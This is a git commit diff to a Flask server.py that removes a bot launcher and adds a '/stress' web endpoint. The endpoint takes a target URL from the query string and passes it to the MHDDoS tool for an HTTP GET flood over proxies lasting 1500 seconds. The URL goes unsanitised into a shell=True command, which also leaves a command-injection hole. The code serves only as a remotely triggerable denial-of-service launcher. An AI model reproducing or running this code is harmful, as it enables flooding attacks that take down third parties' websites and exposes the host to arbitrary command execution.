2c0a8983ccf888487748700382736de8525d3a0c
Spidifa <166976437+Spidifa@users.noreply.github.com>
2024-04-18 19:58:02 +0530

    Add files via upload

--- server.py
+++ server.py
@@ -1,40 +1,46 @@
-from flask import Flask, render_template
+from flask import Flask, render_template, request
 import subprocess
-import os 
-import signal
+import re
 
 app = Flask(__name__)
 
-bot_process = subprocess.Popen(['python3' , 'bot.py'])
+#bot_process = subprocess.Popen(['python3' , 'bot.py'])
+  
+def ddos_start(url):
+  s= 1500
+  subprocess.call(f'python3 ~/MHDDoS/start.py GET {url} 1 400 mhddos_proxy/list 10000 {s}', stdout=subprocess.PIPE, shell=True)
 
-
-def kill_subprocesses():
-    current_pid = os.getpid()
-    cmd = f'pgrep -P {current_pid}'
-    pids = subprocess.check_output(cmd, shell=True).decode().split()
-    for pid in pids:
-        try:
-            os.kill(int(pid), signal.SIGTERM)
-        except OSError:
-            pass
-
-
+  
 
 
 @app.route("/")
 def page_web_de_mort():
-    bot_process
+ #   bot_process
     return "<html><body><img src='https://i.giphy.com/KmHueA88mFABT9GkkR.gif'></body></html>"
     #page_web_de_mort()
     
 @app.route("/kill")
 def killswitch():
-    kill_subprocesses()
     p = subprocess.Popen(f'refresh', stdout=subprocess.PIPE, shell=True)
     output, error = p.communicate()
-    bot_process
+  #  bot_process
     return "<html><body><img src='https://i.giphy.com/6jTD6KqVNADI746GOC.gif'></body></html>"
-    #page_web_de_mort()    
+    #page_web_de_mort()   
+    
+    
+@app.route(f"/stress")
+def ddos():
+  
+    full_url = str(request.args)
+    data = full_url.replace("ImmutableMultiDict([('", '')
+    url = data.replace("', '')])", '')
+   
+    print(url)
+  
+    ddos_start(url)
+
+    return "<html><body><img src='https://i.giphy.com/6jTD6KqVNADI746GOC.gif'></body></html>"
+    #page_web_de_mort() 
     
 
 app.run()
